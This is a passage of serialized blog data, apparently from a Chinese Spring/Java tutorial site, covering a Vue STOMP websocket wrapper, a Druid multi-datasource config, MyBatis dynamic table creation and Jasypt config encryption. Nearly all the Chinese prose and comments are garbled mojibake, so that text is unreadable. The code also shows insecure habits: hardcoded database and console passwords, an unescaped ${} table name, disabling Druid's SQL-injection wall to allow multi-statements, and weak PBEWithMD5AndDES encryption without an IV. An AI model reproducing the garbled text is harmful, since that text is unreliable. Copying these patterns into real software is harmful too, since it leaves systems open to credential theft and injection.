ç¬¬ä¸ä¸ªåæ°è¡¨ç¤ºæå¡å¨åå¥æåéå¿è·³çé¢çã ç¬¬äºä¸ªåæ°è¡¨ç¤ºå®¢æ·ç«¯åéå¿è·³æ¶é´\n//                .setheartbeatvalue(new long[]{15000,3000})\n//                .settaskscheduler(te)\n        ;\n        // å¨å±ä½¿ç¨çæ¶æ¯åç¼ï¼å®¢æ·ç«¯è®¢éè·¯å¾ä¸ä¼ä½ç°åºæ¥ï¼\n//        registry.setapplicationdestinationprefixes("/app");\n        // ç¹å¯¹ç¹ä½¿ç¨çè®¢éåç¼ï¼å®¢æ·ç«¯è®¢éè·¯å¾ä¸ä¼ä½ç°åºæ¥ï¼ï¼ä¸è®¾ç½®çè¯ï¼é»è®¤ä¹æ¯/user/\n        // registry.setuserdestinationprefix("/user/");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# åç«¯ä»£ç \n\nä¾èµ\n\nnpm install sockjs-client\nnpm install stompjs\nnpm install net\nnpm install vue-stomp\n\n\n1\n2\n3\n4\n\n\nå°è£ stomp.js\n\nimport sockjs from \'sockjs-client\'\nimport stomp from \'webstomp-client\'\n\nexport default {\n  // æ¯å¦å¯ç¨æ¥å¿ é»è®¤å¯ç¨\n  debug:true,\n  // å®¢æ·ç«¯è¿æ¥ä¿¡æ¯\n  stompclient:{},\n  // åå§å\n  init(callback){\n    const socket = new sockjs(\'http://127.0.0.1:8005/websocket\')\n    this.stompclient = stomp.over(socket)\n    this.stompclient.hasdebug = this.debug\n    this.stompclient.connect({},suce =>{\n      this.console("è¿æ¥æå,ä¿¡æ¯å¦ä¸ â");\n      this.console(this.stompclient);\n      if(callback){\n        callback();\n      }\n    },err => {\n      if(err) {\n        this.console("è¿æ¥å¤±è´¥,ä¿¡æ¯å¦ä¸ â")\n        this.console(err)\n      }\n    });\n  },\n  // è®¢é\n  sub(address,callback){\n    if(!this.stompclient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³è®¢é");\n      return;\n    }\n    // çæ id\n    let timestamp= new date().gettime() + address\n    this.console("è®¢éæå -> "+address)\n    this.stompclient.subscribe(address,message => {\n      this.console(address+" è®¢éæ¶æ¯éç¥,ä¿¡æ¯å¦ä¸ â")\n      this.console(message)\n      let data = message.body;\n      callback(data);\n    },{\n      id: timestamp\n    })\n  },\n  unsub(address){\n    if(!this.stompclient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³åæ¶è®¢é -> "+address);\n      return;\n    }\n    let id = ""\n    for(let item in this.stompclient.subscriptions){\n      if(item.endswith(address)){\n        id = item;\n        break;\n      }\n    }\n    this.stompclient.unsubscribe(id);\n    this.console("åæ¶è®¢éæå -> id:"+ id + " address:"+address)\n  },\n  // æ­å¼è¿æ¥\n  disconnect(callback){\n    if(!this.stompclient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³æ­å¼è¿æ¥");\n      return;\n    }\n    this.stompclient.disconnect(() =>{\n      console.log("æ­å¼æå")\n      if(callback){\n        callback()\n      }\n    });\n  },\n  // åä½ ç§\n  reconnect(time){\n    setinterval(() =>{\n      if(!this.stompclient.connected){\n        this.console("éæ°è¿æ¥ä¸­...")\n        this.init()\n      }\n    },time * 1000)\n  },\n  console(msg){\n    if(this.debug){\n      console.log(msg);\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\nä»¥ä¸æ¯æèªå·±å°è£çä¸ä¸ª stomp.jsï¼å»ºè®®å¨ç»å½ä¹åè°ç¨ initï¼å¹¶ä¸ä¿è¯ è®¢é å init ç­ææ api å¨ä¸ä¸ªæä»¶ä¸­ä½¿ç¨ï¼å¦åä¼ undefinedãå¯ä»¥ä½¿ç¨ eventbus æ¥ä¼ éæ°æ®ã\n\nå·ä½ä½¿ç¨\n\n  mounted() {\n    // åå§å\n    stomp.init(() =>{\n      // åå§åæå å°±æ§è¡è®¢é\n      stomp.sub("/topic",data =>{\n        console.log(data)\n      })\n      stomp.sub("/topic1",data =>{\n        console.log(data)\n      })\n      // åæ¶è®¢é\n      stomp.unsub("/topic")\n    })\n    //  å¯ç¨éè¿ 5ç§æ£æµä¸æ¬¡\n    stomp.reconnect(5)\n  },\n  destroyed() {\n    stomp.disconnect()\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nè¿æ¥éäºä»¥åï¼å¦æè¯´åç«¯ç¨ websocket åªæ¯ä¸ºäºæ¥æ¶åç«¯çæ¶æ¯ï¼é£ä¹å³äº topic å¯ä»¥éä¾¿è®¾ç½®ï¼è¿éçéä¾¿æææ¯åç«¯ä¸éè¦å»å¨ configuremessagebroker éè®¾ç½®ä»»ä½ä¸è¥¿ï¼åªéè¦ååç«¯å®ä¹æ¸æ¥ topicï¼åç«¯å¯ä»¥å¨æ topic ç»åç«¯ãå¦ä¸ï¼\n\n\n\n\n\n',charsets:{cjk:!0}},{title:"SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº",frontmatter:{title:"SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/203/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/203.SpringBoot%20MyBatisPlus%20%E5%AE%9E%E7%8E%B0%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90.html",relativePath:"00.java/20.Spring/23.springboot/203.SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº.md",key:"v-4eb895bc",path:"/spring/spring-boot/203/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:'å¨ spring boot æ´åä¸­è¿æ¯ä¼åºç°é®é¢ãå¦ä¸ï¼\n\nDescription:\n\nFailed to configure a DataSource: \'url\' attribute is not specified and no embedded datasource could be configured.\n\n\n1\n2\n3\n\n\nåªéè¦å¨ éç½®æä»¶ä¸­å å¦ä¸ï¼\n\nspring:\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure\n\n\n1\n2\n3\n\n\nç¨çæ¯ Druid çæ°æ®æºï¼æä»¥æé¤ Druid ä½¿ç¨ spring boot èªå¸¦çã\n\nä¾èµ\n\n\x3c!-- æ°æ®æä¹ç¸å³éç½® --\x3e\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>${mybatis-plus}</version>\n</dependency>\n\n\x3c!-- é©±å¨ --\x3e\n<dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n</dependency>\n\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid-spring-boot-starter</artifactId>\n    <version>${db-drive}</version>\n</dependency>\n\n\x3c!-- å¤æ°æ®æº --\x3e\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>dynamic-datasource-spring-boot-starter</artifactId>\n    <version>3.1.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\néç½®æä»¶\n\nspring:\n  main:\n    allow-bean-definition-overriding: true\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure\n  datasource:\n    # éç½®çæ§\n    druid:\n      stat-view-servlet:\n        # å¨1.1.9çæ¬ä¸éè¦ï¼ä»¥ä¸å¿é¡»è¦\n        enabled: true\n        url-pattern: "/druid/*"\n        # IPç½åå(æ²¡æéç½®æèä¸ºç©ºï¼ååè®¸ææè®¿é®)\n        allow: 127.0.0.1\n        # IPé»åå (å­å¨å±åæ¶ï¼denyä¼åäºallow)\n        deny: 192.168.1.73\n        # ç¦ç¨HTMLé¡µé¢ä¸çâReset Allâåè½\n        reset-enable: true\n        # ç»å½å\n        login-username: admin\n        # ç»å½å¯ç \n        login-password: admin@2020\n      web-stat-filter:\n        enabled: true\n        url-pattern: "/*"\n        exclusions: "*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*"\n    dynamic:\n      druid:\n        # éç½®çæ§ç»è®¡æ¦æªçfilters,å»æåï¼çæ§çé¢çsqlæ æ³ç»è®¡\n        # filter æä¾çæælog æ¯ä¸ºäº è¾åºJDBCæ§è¡çæ¥å¿\n        filters: stat,wall\n        # åå§åè¿æ¥å¤§å°\n        initial-size: 30\n        # æå°ç©ºé²è¿æ¥æ°\n        min-idle: 20\n        # æå¤§è¿æ¥æ°\n        maxActive: 200\n        # è·åè¿æ¥æ¶æå¤§ç­å¾æ¶é´ï¼åä½æ¯«ç§ï¼ä½¿ç¨\n        maxWait: 10000\n        # maxWait å¹¶åæçä¼ææä¸éï¼maxWait ä¼é æå¬å¹³éï¼useUnfairLock ä½¿ç¨éå¬å¹³é\n        useUnfairLock: true\n        # æ£æµè¿æ¥æ¯å¦å¯ç¨çæµè¯è¯­å¥ å¦æä¸º nullï¼testOnBorrow testOnReturn testWhileIdle é½ä¸èµ·ä½ç¨\n        validation-query: \'select 1\'\n        # testWhileIdle(ç©ºé²æ¶æ£æµ)ï¼å¦æä¸ºtrueï¼é»è®¤trueï¼ï¼å½åºç¨åè¿æ¥æ± ç³è¯·è¿æ¥ï¼å¹¶ä¸testOnBorrowä¸ºfalseæ¶ï¼è¿æ¥æ± å°ä¼å¤æ­è¿æ¥æ¯å¦å¤äºç©ºé²ç¶æï¼å¦ææ¯ï¼åéªè¯è¿æ¡è¿æ¥æ¯å¦å¯ç¨ã\n        # testWhileIdleä»ä¹æ¶åä¼èµ·ä½ç¨? è·åè¿æ¥æ¶ ä¸ testOnBorrow=false testWhileIdle=true\n        testWhileIdle: true\n        # testOnBorrow(è·åè¿æ¥æ¶æ£æµ) æ£æµæ± éè¿æ¥çå¯ç¨æ§ false ä¸æ£æµ true æ£æµ.ä½æ¶èæ§è½ã\n        # åå¦è¿æ¥æ± ä¸­çè¿æ¥è¢«æ°æ®åºå³é­äºï¼åºç¨éè¿è¿æ¥æ± getConnectionæ¶ï¼å¯è½è·åå°è¿äºä¸å¯ç¨çè¿æ¥ï¼ä¸è¿äºè¿æ¥å¦æä¸è¢«å¶ä»çº¿ç¨åæ¶çè¯ï¼å®ä»¬ä¸ä¼è¢«è¿æ¥æ± è¢«åºé¤ï¼ä¹ä¸ä¼éæ°è¢«åå»ºï¼\n        # å ç¨äºè¿æ¥æ± çåé¢ï¼é¡¹ç®æ¬èº«ä½ä¸ºæå¡ç«¯ï¼æ°æ®åºé¾æ¥è¢«å³é­ï¼å®¢æ·ç«¯è°ç¨æå¡ç«¯å°±ä¼åºç°å¤§éçtimeoutï¼å®¢æ·ç«¯è®¾ç½®äºè¶æ¶æ¶é´ï¼ç¶èä¸»å¨æ­å¼ï¼æå¡ç«¯å¿ç¶åºç°close_waitã\n        testOnBorrow: false\n        # è¿æ¥ä¿æç©ºé²èä¸è¢«é©±éçæå°æ¶é´,å¦æè¯´è¿æ¥ççæ­£ç©ºé²æ¶é´ ç­äºè¯¥å¼ï¼åå³é­ç©çè¿æ¥\n        # minEvictableIdleTimeMillis: 30000\n        testOnReturn: false\n      primary: wiedp\n      datasource:\n        # ä¸»åº\n        wiedp:\n          url: jdbc:mysql://10.xx.xx.100:3306/wiedp?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          type: com.alibaba.druid.pool.DruidDataSource\n          username: xx\n#          password: xx@2020\n          password: mysql@dev.2020\n        # ééåº\n        iedp:\n          url: jdbc:mysql://10.xx.xx.101:3306/iedp?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          type: com.alibaba.druid.pool.DruidDataSource\n          username: xxxx\n          password: xxxx@xxxx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\nå®æ¹å®æ´æ¡ä¾',normalizedContent:'å¨ spring boot æ´åä¸­è¿æ¯ä¼åºç°é®é¢ãå¦ä¸ï¼\n\ndescription:\n\nfailed to configure a datasource: \'url\' attribute is not specified and no embedded datasource could be configured.\n\n\n1\n2\n3\n\n\nåªéè¦å¨ éç½®æä»¶ä¸­å å¦ä¸ï¼\n\nspring:\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.druiddatasourceautoconfigure\n\n\n1\n2\n3\n\n\nç¨çæ¯ druid çæ°æ®æºï¼æä»¥æé¤ druid ä½¿ç¨ spring boot èªå¸¦çã\n\nä¾èµ\n\n\x3c!-- æ°æ®æä¹ç¸å³éç½® --\x3e\n<dependency>\n    <groupid>com.baomidou</groupid>\n    <artifactid>mybatis-plus-boot-starter</artifactid>\n    <version>${mybatis-plus}</version>\n</dependency>\n\n\x3c!-- é©±å¨ --\x3e\n<dependency>\n    <groupid>mysql</groupid>\n    <artifactid>mysql-connector-java</artifactid>\n</dependency>\n\n<dependency>\n    <groupid>com.alibaba</groupid>\n    <artifactid>druid-spring-boot-starter</artifactid>\n    <version>${db-drive}</version>\n</dependency>\n\n\x3c!-- å¤æ°æ®æº --\x3e\n<dependency>\n    <groupid>com.baomidou</groupid>\n    <artifactid>dynamic-datasource-spring-boot-starter</artifactid>\n    <version>3.1.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\néç½®æä»¶\n\nspring:\n  main:\n    allow-bean-definition-overriding: true\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.druiddatasourceautoconfigure\n  datasource:\n    # éç½®çæ§\n    druid:\n      stat-view-servlet:\n        # å¨1.1.9çæ¬ä¸éè¦ï¼ä»¥ä¸å¿é¡»è¦\n        enabled: true\n        url-pattern: "/druid/*"\n        # ipç½åå(æ²¡æéç½®æèä¸ºç©ºï¼ååè®¸ææè®¿é®)\n        allow: 127.0.0.1\n        # ipé»åå (å­å¨å±åæ¶ï¼denyä¼åäºallow)\n        deny: 192.168.1.73\n        # ç¦ç¨htmlé¡µé¢ä¸çâreset allâåè½\n        reset-enable: true\n        # ç»å½å\n        login-username: admin\n        # ç»å½å¯ç \n        login-password: admin@2020\n      web-stat-filter:\n        enabled: true\n        url-pattern: "/*"\n        exclusions: "*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*"\n    dynamic:\n      druid:\n        # éç½®çæ§ç»è®¡æ¦æªçfilters,å»æåï¼çæ§çé¢çsqlæ æ³ç»è®¡\n        # filter æä¾çæælog æ¯ä¸ºäº è¾åºjdbcæ§è¡çæ¥å¿\n        filters: stat,wall\n        # åå§åè¿æ¥å¤§å°\n        initial-size: 30\n        # æå°ç©ºé²è¿æ¥æ°\n        min-idle: 20\n        # æå¤§è¿æ¥æ°\n        maxactive: 200\n        # è·åè¿æ¥æ¶æå¤§ç­å¾æ¶é´ï¼åä½æ¯«ç§ï¼ä½¿ç¨\n        maxwait: 10000\n        # maxwait å¹¶åæçä¼ææä¸éï¼maxwait ä¼é æå¬å¹³éï¼useunfairlock ä½¿ç¨éå¬å¹³é\n        useunfairlock: true\n        # æ£æµè¿æ¥æ¯å¦å¯ç¨çæµè¯è¯­å¥ å¦æä¸º nullï¼testonborrow testonreturn testwhileidle é½ä¸èµ·ä½ç¨\n        validation-query: \'select 1\'\n        # testwhileidle(ç©ºé²æ¶æ£æµ)ï¼å¦æä¸ºtrueï¼é»è®¤trueï¼ï¼å½åºç¨åè¿æ¥æ± ç³è¯·è¿æ¥ï¼å¹¶ä¸testonborrowä¸ºfalseæ¶ï¼è¿æ¥æ± å°ä¼å¤æ­è¿æ¥æ¯å¦å¤äºç©ºé²ç¶æï¼å¦ææ¯ï¼åéªè¯è¿æ¡è¿æ¥æ¯å¦å¯ç¨ã\n        # testwhileidleä»ä¹æ¶åä¼èµ·ä½ç¨? è·åè¿æ¥æ¶ ä¸ testonborrow=false testwhileidle=true\n        testwhileidle: true\n        # testonborrow(è·åè¿æ¥æ¶æ£æµ) æ£æµæ± éè¿æ¥çå¯ç¨æ§ false ä¸æ£æµ true æ£æµ.ä½æ¶èæ§è½ã\n        # åå¦è¿æ¥æ± ä¸­çè¿æ¥è¢«æ°æ®åºå³é­äºï¼åºç¨éè¿è¿æ¥æ± getconnectionæ¶ï¼å¯è½è·åå°è¿äºä¸å¯ç¨çè¿æ¥ï¼ä¸è¿äºè¿æ¥å¦æä¸è¢«å¶ä»çº¿ç¨åæ¶çè¯ï¼å®ä»¬ä¸ä¼è¢«è¿æ¥æ± è¢«åºé¤ï¼ä¹ä¸ä¼éæ°è¢«åå»ºï¼\n        # å ç¨äºè¿æ¥æ± çåé¢ï¼é¡¹ç®æ¬èº«ä½ä¸ºæå¡ç«¯ï¼æ°æ®åºé¾æ¥è¢«å³é­ï¼å®¢æ·ç«¯è°ç¨æå¡ç«¯å°±ä¼åºç°å¤§éçtimeoutï¼å®¢æ·ç«¯è®¾ç½®äºè¶æ¶æ¶é´ï¼ç¶èä¸»å¨æ­å¼ï¼æå¡ç«¯å¿ç¶åºç°close_waitã\n        testonborrow: false\n        # è¿æ¥ä¿æç©ºé²èä¸è¢«é©±éçæå°æ¶é´,å¦æè¯´è¿æ¥ççæ­£ç©ºé²æ¶é´ ç­äºè¯¥å¼ï¼åå³é­ç©çè¿æ¥\n        # minevictableidletimemillis: 30000\n        testonreturn: false\n      primary: wiedp\n      datasource:\n        # ä¸»åº\n        wiedp:\n          url: jdbc:mysql://10.xx.xx.100:3306/wiedp?useunicode=true&characterencoding=utf-8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai\n          driver-class-name: com.mysql.cj.jdbc.driver\n          type: com.alibaba.druid.pool.druiddatasource\n          username: xx\n#          password: xx@2020\n          password: mysql@dev.2020\n        # ééåº\n        iedp:\n          url: jdbc:mysql://10.xx.xx.101:3306/iedp?useunicode=true&characterencoding=utf-8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai\n          driver-class-name: com.mysql.cj.jdbc.driver\n          type: com.alibaba.druid.pool.druiddatasource\n          username: xxxx\n          password: xxxx@xxxx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\nå®æ¹å®æ´æ¡ä¾',charsets:{cjk:!0}},{title:"SpringBoot MyBatis å¨æå»ºè¡¨",frontmatter:{title:"SpringBoot MyBatis å¨æå»ºè¡¨",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/204/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/204.SpringBoot%20MyBatis%20%E5%8A%A8%E6%80%81%E5%BB%BA%E8%A1%A8.html",relativePath:"00.java/20.Spring/23.springboot/204.SpringBoot MyBatis å¨æå»ºè¡¨.md",key:"v-61e74299",path:"/spring/spring-boot/204/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:'ä»£ç \n\n    <update  id="createTelemetryTable" parameterType="java.util.List">\n        <foreach item="item" index="index" collection="list">\n            CREATE TABLE if not exists `${item}` (\n                sys_id bigint NOT NULL,\n                mpnt_id bigint NOT NULL,\n                date_time datetime NOT NULL,\n                value_id DECIMAL(10,2) NOT NULL\n            ) ENGINE=MYISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n        </foreach>\n    </update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ¥é\n\nCaused by: java.sql.SQLException: sql injection violation, multi-statement not allow : CREATE TABLE if not exists `rt_telemetry_p` (\n                sys_id bigint NOT NULL,\n                mpnt_id bigint NOT NULL,\n                date_time datetime NOT NULL,\n                value_id DECIMAL(10,2) NOT NULL\n            ) ENGINE=MYISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£å³æ¿å¨ï¼å¨ yml é æ°æ®åºè¿æ¥ url ä¸­å å¥ allowMultiQueries=true ï¼å¨ yml é druid éç½®ä¸­å å¥\n\nwall:\n    multi-statement-allow: true\n\n\n1\n2\n',normalizedContent:'ä»£ç \n\n    <update  id="createtelemetrytable" parametertype="java.util.list">\n        <foreach item="item" index="index" collection="list">\n            create table if not exists `${item}` (\n                sys_id bigint not null,\n                mpnt_id bigint not null,\n                date_time datetime not null,\n                value_id decimal(10,2) not null\n            ) engine=myisam default charset=utf8mb4 collate=utf8mb4_unicode_ci;\n        </foreach>\n    </update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ¥é\n\ncaused by: java.sql.sqlexception: sql injection violation, multi-statement not allow : create table if not exists `rt_telemetry_p` (\n                sys_id bigint not null,\n                mpnt_id bigint not null,\n                date_time datetime not null,\n                value_id decimal(10,2) not null\n            ) engine=myisam default charset=utf8mb4 collate=utf8mb4_unicode_ci;\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£å³æ¿å¨ï¼å¨ yml é æ°æ®åºè¿æ¥ url ä¸­å å¥ allowmultiqueries=true ï¼å¨ yml é druid éç½®ä¸­å å¥\n\nwall:\n    multi-statement-allow: true\n\n\n1\n2\n',charsets:{cjk:!0}},{title:"Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯",frontmatter:{title:"Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/205/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/205.Spring%20Boot%20%E9%9B%86%E6%88%90%20Jasypt%203.0.3%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86.html",relativePath:"00.java/20.Spring/23.springboot/205.Spring Boot éæ Jasypt 3.0.3 éç½®æä»¶å å¯.md",key:"v-f7296352",path:"/spring/spring-boot/205/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:'ä¾èµ\n\n<dependency>\n    <groupId>com.github.ulisesbocchio</groupId>\n    <artifactId>jasypt-spring-boot-starter</artifactId>\n    <version>3.0.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nyml ä¸­æ·»å éç½®æä»¶\n\njasypt:\n  encryptor:\n    # çå å¯\n    password: aabbcc\n    # æå®å å¯æ¹å¼\n    algorithm: PBEWithMD5AndDES\n    iv-generator-classname: org.jasypt.iv.NoIvGenerator\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè¾åºå å¯å¯ç å·¥å·ç±»\n\npackage com.aa.cloud.util;\n\nimport org.jasypt.encryption.pbe.PooledPBEStringEncryptor;\nimport org.jasypt.encryption.pbe.config.SimpleStringPBEConfig;\n\n/**\n * @author big uncle\n * @date 2020/11/23 14:23\n * @module\n **/\npublic class JasyptUtil {\n\n\n    /**\n     * Jasyptçæå å¯ç»æ\n     * @param password éç½®æä»¶ä¸­è®¾å®çå å¯çå¼\n     * @param value å å¯å¼\n     * @return\n     */\n    public static String encyptPwd(String password,String value){\n        PooledPBEStringEncryptor encryptor = new PooledPBEStringEncryptor();\n        encryptor.setConfig(cryptor(password));\n        String result = encryptor.encrypt(value);\n        return result;\n    }\n\n    /**\n     * è§£å¯\n     * @param password éç½®æä»¶ä¸­è®¾å®çå å¯çå¼\n     * @param value è§£å¯å¯æ\n     * @return\n     */\n    public static String decyptPwd(String password,String value){\n        PooledPBEStringEncryptor encryptor = new PooledPBEStringEncryptor();\n        encryptor.setConfig(cryptor(password));\n        String result = encryptor.decrypt(value);\n        return result;\n    }\n\n    public static SimpleStringPBEConfig cryptor(String password){\n        SimpleStringPBEConfig config = new SimpleStringPBEConfig();\n        config.setPassword(password);\n        config.setAlgorithm("PBEWithMD5AndDES");\n        config.setKeyObtentionIterations("1000");\n        config.setPoolSize("1");\n        config.setProviderName("SunJCE");\n        config.setSaltGeneratorClassName("org.jasypt.salt.RandomSaltGenerator");\n        config.setStringOutputType("base64");\n        return config;\n    }\n\n\n    public static void main(String[] args) {\n        // å å¯\n        String encPwd = encyptPwd("giant", "mysql");\n        // è§£å¯\n        String decPwd = decyptPwd("giant", encPwd);\n        System.out.println(encPwd);\n        System.out.println(decPwd);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\nå¾å°å å¯å¯ç è¿è¡æ¿æ¢\n\n  redis:\n    host: 192.168.81.101\n    password: ENC(u1itOZa4Xt3qMyG1VJGa9fc0wDUaQ59/)\n    database: 0\n    port: 26379\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ENC(1iyE4/wqjqSHmFKKVVpLAg==)\n      master: mymaster\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nå»ºè®®é¨ç½²çæ¶å ç ä¸è¦æ¾å°éç½®æä»¶ï¼å¯ä»¥ç¨å¯å¨åæ° -Djasypt.encryptor.password=aabbcc æ¥æ¿ä»£ã',normalizedContent:'ä¾èµ\n\n<dependency>\n    <groupid>com.github.ulisesbocchio</groupid>\n    <artifactid>jasypt-spring-boot-starter</artifactid>\n    <version>3.0.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nyml ä¸­æ·»å éç½®æä»¶\n\njasypt:\n  encryptor:\n    # çå å¯\n    password: aabbcc\n    # æå®å å¯æ¹å¼\n    algorithm: pbewithmd5anddes\n    iv-generator-classname: org.jasypt.iv.noivgenerator\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè¾åºå å¯å¯ç å·¥å·ç±»\n\npackage com.aa.cloud.util;\n\nimport org.jasypt.encryption.pbe.pooledpbestringencryptor;\nimport org.jasypt.encryption.pbe.config.simplestringpbeconfig;\n\n/**\n * @author big uncle\n * @date 2020/11/23 14:23\n * @module\n **/\npublic class jasyptutil {\n\n\n    /**\n     * jasyptçæå å¯ç»æ\n     * @param password éç½®æä»¶ä¸­è®¾å®çå å¯çå¼\n     * @param value å å¯å¼\n     * @return\n     */\n    public static string encyptpwd(string password,string value){\n        pooledpbestringencryptor encryptor = new pooledpbestringencryptor();\n        encryptor.setconfig(cryptor(password));\n        string result = encryptor.encrypt(value);\n        return result;\n    }\n\n    /**\n     * è§£å¯\n     * @param password éç½®æä»¶ä¸­è®¾å®çå å¯çå¼\n     * @param value è§£å¯å¯æ\n     * @return\n     */\n    public static string decyptpwd(string password,string value){\n        pooledpbestringencryptor encryptor = new pooledpbestringencryptor();\n        encryptor.setconfig(cryptor(password));\n        string result = encryptor.decrypt(value);\n        return result;\n    }\n\n    public static simplestringpbeconfig cryptor(string password){\n        simplestringpbeconfig config = new simplestringpbeconfig();\n        config.setpassword(password);\n        config.setalgorithm("pbewithmd5anddes");\n        config.setkeyobtentioniterations("1000");\n        config.setpoolsize("1");\n        config.setprovidername("sunjce");\n        config.setsaltgeneratorclassname("org.jasypt.salt.randomsaltgenerator");\n        config.setstringoutputtype("base64");\n        return config;\n    }\n\n\n    public static void main(string[] args) {\n        // å å¯\n        string encpwd = encyptpwd("giant", "mysql");\n        // è§£å¯\n        string decpwd = decyptpwd("giant", encpwd);\n        system.out.println(encpwd);\n        system.out.println(decpwd);\n    